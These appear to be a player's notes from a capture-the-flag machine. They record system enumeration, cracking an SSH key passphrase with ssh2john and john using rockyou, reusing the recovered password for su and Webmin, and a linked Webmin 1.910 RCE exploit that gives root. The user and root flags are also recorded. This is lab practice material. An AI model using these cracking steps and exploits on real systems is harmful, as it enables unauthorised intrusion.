root:x:0:0:root:/root:/bin/bash
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
Linux version 4.15.0-58-generic
Sudo version 1.8.21p2                                                          
Distribution: ubuntu                                                           
Distribution version: 18.04
127.0.0.53:53
in /opt
found ssh key 
![[Pasted image 20211217091330.png]]
let's try to crack that ssh key password with john
first let's get it to john crackable format with ssh2john
ssh2john id_rsa > id_rsa.john
john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt > cracked.txt
![[Pasted image 20211217092112.png]]
and we have a password
looks like the id_rsa isn't for Matt user 
BUT
trying to su to Matt on the box and it looks like it's Matt's local password
![[Pasted image 20211217092341.png]]
Matt:computer2008
#userflag c6382e8fddf9468ad3cfe5557cde7bd0	

there is same user with same password on webmin
![[Pasted image 20211217092656.png]]
found a CVE that can lead to RCE on the server as the root user
https://raw.githubusercontent.com/NaveenNguyen/Webmin-1.910-Package-Updates-RCE/master/exploit_poc.py
https://www.exploit-db.com/exploits/46984
trying to run the exploit
and we are root!

![[Pasted image 20211217110143.png]]

#rootflag 434789c9862e64c51545efbdc960d02a